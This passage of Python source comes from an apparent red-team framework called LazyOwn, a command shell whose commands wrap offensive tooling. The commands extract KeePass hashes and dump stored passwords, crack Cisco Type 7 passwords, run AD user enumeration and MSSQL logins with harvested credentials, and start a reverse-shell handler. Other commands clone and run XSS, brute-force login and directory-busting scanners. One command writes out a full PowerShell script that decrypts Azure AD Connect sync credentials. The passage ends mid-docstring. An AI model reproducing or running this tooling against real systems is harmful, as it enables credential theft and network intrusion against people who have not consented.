        kdbx_files = [f for f in os.listdir(sessions_dir) if f.endswith('.kdbx')]

        if not kdbx_files:
            print_error("No .kdbx files found in the 'sessions' directory.")
            return

        print_msg("Available .kdbx files:")
        for idx, file in enumerate(kdbx_files):
            print_msg(f"{idx}: {file}")

        try:
            file_index = int(input(f"    {GREEN}[!] Select the file number to use: "))
            selected_file = kdbx_files[file_index]
        except (IndexError, ValueError):
            print_error("Invalid selection.")
            return

        selected_file_path = os.path.join(sessions_dir, selected_file)

        hash_file_path = os.path.join(sessions_dir, 'hash.txt')
        if os.path.exists(hash_file_path):
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            backup_hash_file = os.path.join(sessions_dir, f"hash_{timestamp}.txt")
            os.rename(hash_file_path, backup_hash_file)
            print_warn(f"Existing hash.txt file backed up as: {backup_hash_file}")
        command = f"sudo keepass2john {selected_file_path} > {hash_file_path}"
        try:
            print_msg(command)
            self.cmd(command)
            print_msg(f"Hash saved in: {hash_file_path}")
        except Exception as e:
            print_error(f"Error executing command: {str(e)}")
        return

    @cmd2.with_category(credential_access_category)
    def do_keepass(self, line):
        """
        Open a .kdbx file and print the titles and contents of all entries. The password can be provided through
        the 'line' parameter, via user input, or from a 'credentials.txt' file in the 'sessions' directory.

        If the file 'credentials.txt' exists in the 'sessions' directory, the first password from it
        will be used automatically.

        Parameters:
        line (str): An optional string parameter to pass the password. If not provided, the user will
                    be prompted to input the password.

        Returns:
        None
        """
        sessions_dir = 'sessions'
        kdbx_files = [f for f in os.listdir(sessions_dir) if f.endswith('.kdbx')]

        if not kdbx_files:
            print_error("No .kdbx files found in the 'sessions' directory.")
            return

        print_msg("Available .kdbx files:")
        for idx, file in enumerate(kdbx_files):
            print_msg(f"{idx}: {file}")

        try:
            file_index = int(input(f"    {GREEN}[!] Select the file number to use: "))
            selected_file = kdbx_files[file_index]
        except (IndexError, ValueError):
            print_error("Invalid selection.")
            return

        selected_file_path = os.path.join(sessions_dir, selected_file)

        if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
            credentials = get_credentials()
            if not credentials:
                return

            for user, passwd in credentials:
                password = passwd
        else:
            password = line if line else input(f"{GREEN}    [!] Enter the master password: ")

        try:
            from pykeepass import PyKeePass
            kp = PyKeePass(selected_file_path, password=password)

            print_msg(f"Entries in {selected_file}:")
            for entry in kp.entries:
                print_msg(f"Title: {entry.title}")
                print_msg(f"Username: {entry.username}")
                print_msg(f"Password: {entry.password}")
                print_msg(f"URL: {entry.url}")
                print_msg(f"Notes: {entry.notes}")
                print_msg("-" * 40)

        except Exception as e:
            print_error(f"Failed to open or process the file: {str(e)}")

        return

    @cmd2.with_category(lateral_movement_category)
    def do_mssqlcli(self, line):
        """
        Attempts to connect to an MSSQL server using the mssqlclient.py tool with Windows authentication.

        The function retrieves the necessary parameters (remote host and domain) from the
        instance's parameter dictionary. If a credentials file exists in the 'sessions_dir',
        it reads the file and uses the username/password combinations found there. If the file
        does not exist, it prompts the user for a username and password.

        The password is copied to the clipboard for convenience. A command is constructed using
        the mssqlclient.py tool, and it is then executed to initiate the connection to the MSSQL
        server.

        Args:
            line (str): The password input from the command line or an empty string if not provided.

        Returns:
            None
        """
        sessions_dir = "sessions"
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        fulldomain = f"{subdomain}.{domain}"
        if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
            if line:
                credentials = get_credentials(ncred=int(line))
            else:
                credentials = get_credentials()
            if not credentials:
                return

            for user, passwd in credentials:
                password = passwd
                username = user
        else:
            command = f"impacket-mssqlclient -k {fulldomain}"
            print_msg(command)
            self.cmd(command)
            return
        try:
            copy2clip(password)
            command = f"mssqlclient.py {domain}/{username}@{rhost}"
            print_msg(command)
            self.cmd(command)
            return

        except Exception as e:
            print_error(f"Failed to Connect with the mssql: {str(e)}")

        return

    @cmd2.with_category(exfiltration_category)
    def do_getadusers(self, line):
        """
        Executes the GetADUsers.py script to retrieve Active Directory users.

        The function retrieves the necessary parameters (domain controller IP and domain) from the
        instance's parameter dictionary. If a credentials file exists in the 'sessions_dir',
        it reads the file and uses the username/password combinations found there. If the file
        does not exist, it prompts the user for a username and password.

        The password is copied to the clipboard for convenience. A command is constructed using
        the GetADUsers.py tool, and it is then executed to enumerate Active Directory users.

        Args:
            line (str): The password input from the command line or an empty string if not provided.

        Returns:
            None
        """
        sessions_dir = "sessions"
        rhost = self.params["rhost"]
        domain = self.params["domain"]

        if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
            credentials = get_credentials()
            if not credentials:
                return

            for user, passwd in credentials:
                password = passwd
                username = user
            command = f"GetADUsers.py {domain}/{username} -dc-ip {rhost} -debug"
            try:
                copy2clip(password)

                print_msg(command)
                self.cmd(command)
                return

            except Exception as e:
                print_error(f"Failed to execute GetADUsers: {str(e)}")

        else:

            txt_files = [f for f in os.listdir(sessions_dir) if f.endswith('.txt')]

            if not txt_files:
                print_error("No .txt files found in the 'sessions' directory.")
                return

            print_msg("Available .txt files:")
            for idx, file in enumerate(txt_files):
                print_msg(f"{idx}: {file}")

            try:
                file_index = int(input(f"    {GREEN}[!] Select the file number to use: "))
                selected_file = txt_files[file_index]
            except (IndexError, ValueError):
                print_error("Invalid selection.")
                return

            selected_file_path = os.path.join(sessions_dir, selected_file)
            try:

                with open(selected_file_path, 'r') as file:
                    for line in file:
                        username = line.strip()
                        if username:
                            command = f"GetADUsers.py {domain}/{username} -no-pass -dc-ip {rhost} -debug -k 2>/dev/null"
                            print_msg(f"Executing: {command}")
                            self.cmd(command)
            except Exception as e:
                print_error(f"Failed to execute GetADUsers for users in {selected_file_path}: {str(e)}")

        return

    @cmd2.with_category(credential_access_category)
    def do_crack_cisco_7_password(self, line):
        """
        Crack a Cisco Type 7 password hash and display the plaintext.

        This command takes an encrypted Cisco Type 7 password hash as input,
        processes it to recover the original plaintext password, and prints the
        result to the console.

        Args:
            line (str): The encrypted password hash in Cisco Type 7 format.

        Returns:
            None: The function prints the plaintext password directly to the console.
        """
        crypttext = line.strip()
        plaintext = crack_password(crypttext)
        if plaintext:
            print_msg(f'[+] Plaintext: {plaintext} [👽]')
        else:
            print_warn('[-] Invalid input.')

    @cmd2.with_category(scanning_category)
    def do_loxs(self, line):
        """
        Command loxs: Installs and runs Loxs for multi-vulnerability web application scanning.

        This function performs the following tasks:
        1. Checks if Loxs is already cloned in the external/.exploit directory.
        2. Clones the Loxs repository if not present.
        3. Installs required dependencies.
        4. Prompts the user for a URL or file input, custom payload file, success criteria, and thread count.
        5. Executes Loxs for scanning vulnerabilities like LFI, OR, XSS, and SQLi.
        6. Displays real-time results and optionally saves vulnerable URLs.

        Args:
            line (str): Optional argument for specifying the input URL or file, custom payload, and additional options.

        Returns:
            None

        Example:
            loxs --url target.com
        """
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        loxs_url = "https://github.com/coffinxp/loxs.git"
        loxs_dir = os.path.join(exploit_dir, "loxs")
        url = self.params["url"]
        os.makedirs(exploit_dir, exist_ok=True)

        if not os.path.exists(loxs_dir):
            print_msg("Cloning Loxs repository...")
            self.cmd(f"git clone {loxs_url} {loxs_dir}")
            print_msg("Installing requirements...")
            self.cmd(f"cd {loxs_dir} && pip3 install -r requirements.txt")

        else:
            print_msg("Loxs already cloned, skipping cloning.")

        command = f"cd {loxs_dir} && python3 loxs.py"

        print_msg(f"Running Loxs scan: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(scanning_category)
    def do_blazy(self, line):
        """
        Command blazy: Installs and runs blazy for multi-vulnerability web application scanning.

        This function performs the following tasks:
        1. Checks if blazy is already cloned in the external/.exploit directory.
        2. Clones the blazy repository if not present.
        3. Installs required dependencies.
        4. Prompts the user for a URL or file input, custom payload file, success criteria, and thread count.
        5. Executes blazy for Bruteforce Login.
        6. Displays real-time results and optionally saves vulnerable URLs.

        Args:
            line (str): Optional argument for specifying the input URL.

        Returns:
            None

        Example:
            python3 main.py -i target.com
        """
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        blazy_url = "https://github.com/s0md3v/Blazy.git"
        blazy_dir = os.path.join(exploit_dir, "blazy")
        url = self.params["url"]
        os.makedirs(exploit_dir, exist_ok=True)

        if not os.path.exists(blazy_dir):
            print_msg("Cloning blazy repository...")
            self.cmd(f"git clone {blazy_url} {blazy_dir}")
            print_msg("Installing requirements...")
            self.cmd(f"cd {blazy_dir}")

        else:
            print_msg("blazy already cloned, skipping cloning.")


        if not line:
            target = input(f"    {GREEN}[!] Enter the target url (Default: {url}): ") or url
        else:
            target = line.strip()

        command = f"cd {blazy_dir} && python3 main.py -i {target}"

        print_msg(f"Running blazy scan: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(scanning_category)
    def do_parth(self, line):
        """
        Command parth: Installs and runs Parth for discovering vulnerable URLs and parameters.

        This function performs the following tasks:
        1. Checks if Parth is already cloned in the external/.exploit directory.
        2. Clones the Parth repository if not present.
        3. Installs required dependencies using pip3.
        4. Prompts the user for a URL, file input, or import option and allows for custom output such as JSON or saving parameter names.
        5. Executes Parth for scanning vulnerabilities like LFI, SSRF, SQLi, XSS, and open redirects.
        6. Displays real-time results and optionally saves output in a file.

        Args:
            line (str): Optional argument for specifying the target domain, import file, or additional Parth options.

        Returns:
            None

        Example:
            parth -t example.com
        """
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        parth_url = "https://github.com/s0md3v/Parth.git"
        parth_dir = os.path.join(exploit_dir, "Parth")
        domain = self.params["domain"]
        os.makedirs(exploit_dir, exist_ok=True)

        if not os.path.exists(parth_dir):
            print_msg("Cloning Parth repository...")
            self.cmd(f"git clone {parth_url} {parth_dir}")
            print_msg("Installing Parth requirements...")
            self.cmd(f"pip3 install parth")

        else:
            print_msg("Parth already cloned, skipping cloning.")


        if not line:
            target = input(f"    {GREEN}[!] Enter the target domain or file: (default: {domain}) ").strip() or domain
            output = input("    [?] Do you want to save output as JSON (y/n)? ").strip().lower() or 'n'
            json_output = f"-o {target}.json" if output == 'y' else ""
            import_option = input("    [?] Specify an import option (e.g., -i file.history, --pipe xss, or leave blank): ").strip() or ""
        else:
            target = line.strip()
            output = input("    [?] Do you want to save output as JSON (y/n)? ").strip().lower() or 'n'
            json_output = f"-o {target}.json" if output == 'y' else ""
            import_option = input("    [?] Specify an import option (e.g., -i file.history, --pipe xss, or leave blank): ").strip() or ""

        if not target:
            print_warn("No target provided, aborting scan.")
            return

        command = f"parth -t {target} {json_output} {import_option}"
        print_msg(f"Running Parth scan: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(scanning_category)
    def do_breacher(self, line):
        """
        Command breacher: Installs and runs Breacher for finding admin login pages and EAR vulnerabilities.

        This function performs the following tasks:
        1. Checks if Breacher is already cloned in the external/.exploit directory.
        2. Clones the Breacher repository if not present.
        3. Installs required dependencies.
        4. Prompts the user for a target URL, file type (php, asp, html), custom paths, and thread options.
        5. Executes Breacher for scanning admin login pages and potential EAR vulnerabilities.
        6. Supports multi-threading and custom paths for enhanced scanning.

        Args:
            line (str): Optional argument for specifying the target URL, file type, and additional Breacher options.

        Returns:
            None

        Example:
            breacher -u example.com --type php
        """
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        breacher_url = "https://github.com/s0md3v/Breacher.git"
        breacher_dir = os.path.join(exploit_dir, "Breacher")
        url = self.params["url"]
        os.makedirs(exploit_dir, exist_ok=True)

        if not os.path.exists(breacher_dir):
            print_msg("Cloning Breacher repository...")
            self.cmd(f"git clone {breacher_url} {breacher_dir}")
            print_msg("Installing Breacher requirements...")
            self.cmd(f"pip3 install -r {breacher_dir}/requirements.txt")

        else:
            print_msg("Breacher already cloned, skipping cloning.")

        if not line:
            url = input(f"    [!] Enter the target URL (default: {url}): ").strip() or url
            file_type = input("    [?] Enter the file type (php, asp, html): ").strip() or "php"
            custom_path = input("    [?] Specify a custom path of url (optional): ").strip() or ""
            threads = input("    [?] Enable multi-threading? (y/n): ").strip().lower() or 'n'
            fast_flag = "--fast" if threads == 'y' else ""
        else:
            args = line.split()
            url = args[0] if len(args) > 0 else ""
            file_type = args[1] if len(args) > 1 else "php"
            custom_path = args[2] if len(args) > 2 else ""
            fast_flag = "--fast" if len(args) > 3 and args[3] == "--fast" else ""

        if not url:
            print_warn("No URL provided, aborting scan.")
            return

        path_flag = f"--path {custom_path}" if custom_path else ""
        command = f"python {breacher_dir}/breacher.py -u {url} --type {file_type} {path_flag} {fast_flag}"

        print_msg(f"Running Breacher scan: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_xsstrike(self, line):
        """
        Command xsstrike: Installs and runs XSStrike for finding XSS vulnerabilities.

        This function performs the following tasks:
        1. Checks if XSStrike is already cloned in the external/.exploit directory.
        2. Clones the XSStrike repository if not present.
        3. Installs required dependencies.
        4. Prompts the user for a target URL, crawling level, request method, encoding, and additional XSStrike options.
        5. Executes XSStrike for testing vulnerabilities, supporting multiple features like fuzzing, blind XSS injection, crawling, and more.

        Args:
            line (str): Optional argument for specifying the target URL, crawling level, encoding, and other XSStrike options.

        Returns:
            None

        Example:
            xsstrike -u http://example.com/search.php?q=query --crawl -l 3
        """
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        xsstrike_url = "https://github.com/s0md3v/XSStrike.git"
        xsstrike_dir = os.path.join(exploit_dir, "XSStrike")
        url = self.params["url"]
        os.makedirs(exploit_dir, exist_ok=True)

        if not os.path.exists(xsstrike_dir):
            print_msg("Cloning XSStrike repository...")
            self.cmd(f"git clone {xsstrike_url} {xsstrike_dir}")
            print_msg("Installing XSStrike requirements...")
            self.cmd(f"pip3 install -r {xsstrike_dir}/requirements.txt")
        else:
            print_msg("XSStrike already cloned, skipping cloning.")



        if not line:
            url = input(f"    {GREEN}[!] Enter the target URL(default {url}): ").strip() or url
            post_data = input("    [?] Enter POST data (optional): ").strip() or ""
            encoding = input("    [?] Specify payload encoding (optional, e.g., base64): ").strip() or ""
            crawl_level = input("    [?] Enter crawling level (optional, default is 2): ").strip() or "2"
            fuzzer = input("    [?] Enable fuzzer? (y/n): ").strip().lower() or 'n'
            path_flag = input("    [?] Inject payloads in the path? (y/n): ").strip().lower() or 'n'
        else:
            args = line.split()
            url = args[0] if len(args) > 0 else ""
            post_data = args[1] if len(args) > 1 else ""
            encoding = args[2] if len(args) > 2 else ""
            crawl_level = args[3] if len(args) > 3 else "2"
            fuzzer = args[4] if len(args) > 4 and args[4] == "--fuzzer" else 'n'
            path_flag = "--path" if len(args) > 5 and args[5] == "--path" else 'n'

        if not url:
            print_warn("No URL provided, aborting scan.")
            return

        data_flag = f"--data '{post_data}'" if post_data else ""
        encode_flag = f"--encode {encoding}" if encoding else ""
        fuzzer_flag = "--fuzzer" if fuzzer == 'y' else ""
        crawl_flag = f"--crawl -l {crawl_level}" if crawl_level else ""
        path_option = "--path" if path_flag == 'y' else ""

        command = f"python {xsstrike_dir}/xsstrike.py -u {url} {data_flag} {encode_flag} {crawl_flag} {fuzzer_flag} {path_option}"

        print_msg(f"Running XSStrike scan: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(lateral_movement_category)
    def do_penelope(self, line):
        """
        Command penelope: Installs and runs Penelope for handling reverse and bind shells.

        This function performs the following tasks:
        1. Checks if Penelope is already cloned in the external/.exploit directory.
        2. Clones the Penelope repository if not present.
        3. Prompts the user for various options to configure and run Penelope.
        4. Executes Penelope with the specified options, supporting multiple features like reverse shell, bind shell, file server, etc.

        Args:
            line (str): Optional argument for specifying the port and other Penelope options.

        Returns:
            None

        Example:
            penelope 5555 -i eth0
        """

        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        penelope_url = "https://github.com/brightio/penelope.git"
        penelope_dir = os.path.join(exploit_dir, "penelope")
        default_port = self.params["lport"]
        os.makedirs(exploit_dir, exist_ok=True)

        if not os.path.exists(penelope_dir):
            print_msg("Cloning Penelope repository...")
            self.cmd(f"git clone {penelope_url} {penelope_dir}")
        else:
            print_msg("Penelope already cloned, skipping cloning.")

        if not line:
            port = input(f"    {GREEN}[!] Enter the port to listen/connect to (default {default_port}): ").strip() or default_port
            interface = input("    [?] Enter the interface or IP address to listen on (optional, default is 0.0.0.0): ").strip() or "0.0.0.0"
            connect = input("    [?] Enter the bind shell host (optional): ").strip()
            show_payloads = input("    [?] Show sample payloads for reverse shell? (y/n): ").strip().lower() == 'y'
            list_interfaces = input("    [?] Show the available network interfaces? (y/n): ").strip().lower() == 'y'
            maintain_shells = input("    [?] Maintain total shells per target? Enter number (optional): ").strip()
            serve_files = input("    [?] Serve files via HTTP? (y/n): ").strip().lower() == 'y'
            file_server_port = input("    [?] Enter file server port (default 8000): ").strip() or "8000"
            file_server_password = input("    [?] Enter URL prefix password (optional): ").strip()
        else:
            args = line.split()
            port = args[0] if len(args) > 0 else default_port
            interface = ""
            connect = ""
            show_payloads = False
            list_interfaces = False
            maintain_shells = ""
            serve_files = False
            file_server_port = "8000"
            file_server_password = ""

            i_flag = False
            c_flag = False
            s_flag = False

            for i in range(1, len(args)):
                if args[i] == '-i':
                    i_flag = True
                    continue
                if args[i] == '-c':
                    c_flag = True
                    continue
                if args[i] == '-s':
                    s_flag = True
                    continue

                if i_flag:
                    interface = args[i]
                    i_flag = False
                elif c_flag:
                    connect = args[i]
                    c_flag = False
                elif s_flag:
                    file_server_port = args[i]
                    s_flag = False
                elif args[i] == '-a':
                    show_payloads = True
                elif args[i] == '-l':
                    list_interfaces = True
                elif args[i].startswith('-m'):
                    maintain_shells = args[i+1]
                elif args[i] == '-pass':
                    file_server_password = args[i+1]

        command = f"python3 {penelope_dir}/penelope.py {port}"
        if interface:
            command += f" -i {interface}"
        if connect:
            command += f" -c {connect}"
        if show_payloads:
            command += " -a"
        if list_interfaces:
            command += " -l"
        if maintain_shells:
            command += f" -m {maintain_shells}"
        if serve_files:
            command += " -s"
            if file_server_port:
                command += f" -p {file_server_port}"
            if file_server_password:
                command += f" -pass {file_server_password}"

        print_msg(f"Running Penelope with command: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(miscellaneous_category)
    def do_h(self, arg):
        """
        Open a new window within a tmux session using the LazyOwn RedTeam Framework.

        This method is designed to create a new horizontal split window in an existing
        tmux session, where the specified command will be executed. The command
        used to open the new window is the `./run --no-banner` script, which is
        intended for use within the LazyOwn RedTeam Framework environment.

        The method first ensures that the specified tmux session is active by calling
        the `ensure_tmux_session` function. If the session is not already running,
        it will create a new one. After confirming that the session is active, it
        proceeds to create a new horizontal window with a specified size. The size of
        the new window is currently set to 50% of the available terminal space.

        Args:
            arg (str): Additional arguments passed to the command, if any. This can be
                        used to customize the behavior of the command executed in the
                        new window. However, in the current implementation, this
                        argument is not utilized and can be left as an empty string.

        Example:
            If this method is called within a command-line interface of the LazyOwn
            RedTeam Framework, it will open a new horizontal tmux window and execute
            the `./run --no-banner` command within it.

        Note:
            - Ensure that tmux is installed and properly configured on the system.
            - The method assumes that the session name is defined and accessible in
            the scope where this method is called.
        """
        ensure_tmux_session(session_name)
        size = 50
        print_msg(f"Open new Windows: {size}")
        command = f"tmux split-window -v -t {session_name} -p {size} \"bash -c './run --no-banner' C-m\""
        print_msg(command)
        subprocess.run(command, shell=True)

    @cmd2.with_category(miscellaneous_category)
    def do_v(self, arg):
        """
        Open a new window within a tmux session using the LazyOwn RedTeam Framework.

        This method is designed to create a new vertical split window in an existing
        tmux session, where the specified command will be executed. The command
        used to open the new window is the `./run --no-banner` script, which is
        intended for use within the LazyOwn RedTeam Framework environment.

        The method first ensures that the specified tmux session is active by calling
        the `ensure_tmux_session` function. If the session is not already running,
        it will create a new one. After confirming that the session is active, it
        proceeds to create a new vertical window with a specified size. The size of
        the new window is currently set to 50% of the available terminal space.

        Args:
            arg (str): Additional arguments passed to the command, if any. This can be
                        used to customize the behavior of the command executed in the
                        new window. However, in the current implementation, this
                        argument is not utilized and can be left as an empty string.

        Example:
            If this method is called within a command-line interface of the LazyOwn
            RedTeam Framework, it will open a new vertical tmux window and execute
            the `./run --no-banner` command within it.

        Note:
            - Ensure that tmux is installed and properly configured on the system.
            - The method assumes that the session name is defined and accessible in
            the scope where this method is called.
        """
        ensure_tmux_session(session_name)
        size = 50
        print_msg(f"Open new Windows: {size}")
        command = f"tmux split-window -h -t {session_name} -p {size} \"bash -c './run --no-banner' C-m\""
        print_msg(command)
        subprocess.run(command, shell=True)

    @cmd2.with_category(exfiltration_category)
    def do_adgetpass(self, line):
        """
        Command adgetpass: Generates a PowerShell script to extract credentials from Azure AD Connect Sync.

        This function generates a PowerShell script based on user inputs, including the SQL server,
        database, and custom keyset values. The script retrieves encryption keys, decrypts credentials,
        and outputs the domain, username, and password from the AD Sync configuration.

        Args:
            line (str): Optional argument to specify the server name, database name, and other options
                        in the following format: "server_name database_name keyset_id instance_id entropy".

        Returns:
            None

        Example:
            adgetpass MONTEVERDE ADSync 1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD
        """

        args = line.split() if line else []
        subdomain = self.params["subdomain"]
        server = args[0] if len(args) > 0 else input(f"    [!] Enter the SQL Server (default '{subdomain}'): ").strip() or subdomain
        database = args[1] if len(args) > 1 else input("    [!] Enter the Database Name (default 'ADSync'): ").strip() or "ADSync"
        key_id = args[2] if len(args) > 2 else input("    [!] Enter Keyset ID (default '1'): ").strip() or "1"
        instance_id = args[3] if len(args) > 3 else input("    [!] Enter Instance ID (GUID): ").strip()
        entropy = args[4] if len(args) > 4 else input("    [!] Enter Entropy (GUID): ").strip()
        dll_path = input("    [!] Enter the path to 'mcrypt.dll' (default 'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'): ").strip() or 'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll'
        config1 = input("    [!] enter parameter nº 1 (default: forest-login-domain)") or "forest-login-domain"
        config2 = input("    [!] enter parameter nº 2 (default: forest-login-user)") or "forest-login-user"
        ps_script = '''Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
        $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server={server};Database={database};Trusted_Connection=true"
        $client.Open()
        $cmd = $client.CreateCommand()
        $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
        $reader = $cmd.ExecuteReader()
        $reader.Read() | Out-Null
        $config = $reader.GetString(0)
        $crypted = $reader.GetString(1)
        $reader.Close()

        add-type -path '{dll_path}'
        $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
        $km.LoadKeySet([GUID]"{entropy}", [GUID]"{instance_id}", {key_id})
        $key = $null
        $km.GetActiveCredentialKey([ref]$key)
        $key2 = $null
        $km.GetKey(1, [ref]$key2)
        $decrypted = $null
        $key2.DecryptBase64ToString($crypted, [ref]$decrypted)

        $domain = (select-xml -Content $config -XPath "//parameter[@name='{config1}']").Node.InnerText
        $username = (select-xml -Content $config -XPath "//parameter[@name='{config2}']").Node.InnerText
        $password = (select-xml -Content $decrypted -XPath "//attribute").Node.InnerText

        Write-Host ("Domain: " + $domain)
        Write-Host ("Username: " + $username)
        Write-Host ("Password: " + $password)
        '''.replace("{server}", server).replace("{database}", database).replace("{dll_path}", dll_path).replace("{entropy}", entropy).replace("{instance_id}", instance_id).replace("{key_id}", key_id).replace("        ","").replace("{config1}", config1).replace("{config2}", config2)

        with open('sessions/adconnect.ps1', 'w') as file:
            file.write(ps_script)

        print_msg("PowerShell script 'sessions/adconnect.ps1' has been created.")
        return

    @cmd2.with_category(scanning_category)
    def do_openredirex(self, line):
        """
        Command openredirex: Clones, installs, and runs OpenRedirex for testing open redirection vulnerabilities.

        This function performs the following tasks:
        1. Clones the OpenRedirex repository if not already cloned.
        2. Installs the required dependencies using the setup script.
        3. Prompts the user for required inputs like the URL list, payloads file, keyword, and concurrency level.
        4. Executes OpenRedirex to scan the provided URLs for open redirection vulnerabilities.

        Args:
            line (str): Optional argument for specifying the URL list, payload file, keyword, and concurrency level.

        Returns:
            None

        Example:
            openredirex list_of_urls.txt payloads.txt FUZZ 50
        """
        url = self.params["url"]
        path = os.getcwd()
        exploit_dir = os.path.join(path, "external/.exploit")
        openredirex_url = "https://github.com/devanshbatham/openredirex.git"
        openredirex_dir = os.path.join(exploit_dir, "openredirex")
        file_payloads = f"{path}/sessions/payloads.txt"
        os.makedirs(exploit_dir, exist_ok=True)
        file_url = f"{path}/sessions/urls.txt"
        with open(file_url, 'w') as file:
            file.write(url)

        if not os.path.exists(openredirex_dir):
            print_msg("Cloning OpenRedirex repository...")
            self.cmd(f"git clone {openredirex_url} {openredirex_dir}")
            print_msg("Setting up OpenRedirex...")
            self.cmd(f"chmod +x {openredirex_dir}/setup.sh && {openredirex_dir}/setup.sh")
        else:
            print_msg("OpenRedirex already cloned and setup, skipping setup.")

        if not line:
            urls_file = input(f"    {GREEN}[!] Enter the path to the list of URLs (default: {file_url}): ").strip() or file_url
            payloads_file = input(f"    [?] Enter the path to the payloads file (default: {file_payloads}): ").strip() or file_payloads
            keyword = input("    [?] Enter the keyword to replace in URLs (default 'FUZZ'): ").strip() or "FUZZ"
            concurrency = input("    [?] Enter the concurrency level (default 100): ").strip() or "100"

        else:
            args = line.split()
            urls_file = args[0] if len(args) > 0 else ""
            payloads_file = args[1] if len(args) > 1 else ""
            keyword = args[2] if len(args) > 2 else "FUZZ"
            concurrency = args[3] if len(args) > 3 else "100"

        if not urls_file:
            print_warn("No URL file provided, aborting scan.")
            return

        payloads_option = f"-p {payloads_file}" if payloads_file else ""
        command = f"cat {urls_file} | python3 {openredirex_dir}/openredirex.py {payloads_option} -k {keyword} -c {concurrency}"

        print_msg(f"Running OpenRedirex scan: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(scanning_category)
    def do_feroxbuster(self, line):
        """
        Command feroxbuster: Installs and runs Feroxbuster for performing forced browsing and directory brute-forcing.

        This function performs the following tasks:
        1. Installs Feroxbuster using a `curl` command if it's not already installed.
        2. Prompts the user for required inputs like the target URL, wordlist, file extensions, and additional options.
        3. Executes Feroxbuster for directory enumeration and brute-force attacks.

        Args:
            line (str): Optional argument for specifying the target URL, wordlist, and other Feroxbuster options.

        Returns:
            None

        Example:
            feroxbuster -u http://example.com -w wordlist.txt -x php,html
        """
        url = self.params["url"]
        wordlist = self.params["wordlist"]
        path = os.getcwd()

        exploit_dir = os.path.join(path, "external/.exploit")
        feroxbuster_url = "https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh"
        feroxbuster_bin = os.path.join(os.getenv("HOME"), ".local/bin/feroxbuster")

        os.makedirs(exploit_dir, exist_ok=True)

        if not os.path.exists(feroxbuster_bin):
            print_msg("Installing Feroxbuster...")
            self.cmd(f"curl -sL {feroxbuster_url} | bash -s $HOME/.local/bin")
        else:
            print_msg("Feroxbuster already installed, skipping installation.")

        if not line:
            url = input(f"    {GREEN}[!] Enter the target URL (default: {url}): ").strip() or url
            wordlist = input(f"    [?] Enter the wordlist file (default: {wordlist}): ").strip() or wordlist
            extensions = input("    [?] Enter file extensions (comma-separated, optional): ").strip()
            headers = input("    [?] Enter additional headers (optional): ").strip()
            recursion = input("    [?] Enable recursion? (y/n, default 'y'): ").strip().lower() or 'y'
            verbosity = input("    [?] Verbosity level (1-3, default '1'): ").strip() or "1"

        else:
            args = line.split()
            url = args[0] if len(args) > 0 else ""
            wordlist = args[1] if len(args) > 1 else ""
            extensions = args[2] if len(args) > 2 else ""
            headers = args[3] if len(args) > 3 else ""
            recursion = args[4] if len(args) > 4 else 'y'
            verbosity = args[5] if len(args) > 5 else "1"

        if not url:
            print_warn("No URL provided, aborting scan.")
            return

        wordlist_option = f"-w {wordlist}" if wordlist else ""
        extensions_option = f"-x {extensions.replace(',', ' -x ')}" if extensions else ""
        headers_option = f"-H {headers}" if headers else ""
        recursion_option = "--no-recursion" if recursion == 'n' else ""
        verbosity_option = f"-{'v' * int(verbosity)}"


        command = f"{feroxbuster_bin} -u {url} {wordlist_option} {extensions_option} {headers_option} {recursion_option} {verbosity_option}"

        print_msg(f"Running Feroxbuster scan: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(reporting_category)
    def do_gowitness(self, line):
        """
        Command gowitness: Installs and runs Gowitness for screenshotting web services or network CIDR blocks.

        This function performs the following tasks:
        1. Ensures that Gowitness is installed (if not, installs it).
        2. Allows the user to select the scan type (single, scan, nmap, report).
        3. Based on the scan type, prompts for the appropriate input (URL or XML file).
        4. Allows the user to choose additional flags based on the scan type.
        5. Executes Gowitness with the chosen parameters.

        Args:
            line (str): Optional argument for specifying the URL or scan type.

        Returns:
            None

        Example:
            gowitness nmap -f scan_results.xml --write-db
        """

        gowitness_path = os.path.expanduser("~/go/bin/gowitness")
        path = os.getcwd()
        sessions = f"{path}/sessions"
        rhost = self.params["rhost"]
        if not os.path.exists(gowitness_path):
            print_warn("Gowitness not found, installing...")
            self.cmd("go install github.com/sensepost/gowitness@latest")
        else:
            print_msg("Gowitness already installed, skipping installation.")

        gowitness_command = f"{gowitness_path} report server --screenshot-path {sessions}/img/{rhost}_screenshots"

        print_msg(f"Running Gowitness scan: {gowitness_command}")
        self.cmd(gowitness_command)

        return

    @cmd2.with_category(scanning_category)
    def do_odat(self, line):
        """
        Command odat: Runs the ODAT sidguesser module to guess Oracle SIDs on a target Oracle database.

        This function performs the following tasks:
        1. Ensures that ODAT is installed (checks if 'odat.py' exists).
        2. Allows the user to specify the RHOST and port.
        3. Runs ODAT's 'sidguesser' module with the specified parameters.

        Args:
            line (str): Optional argument for specifying additional ODAT options.

        Returns:
            None

        Example:
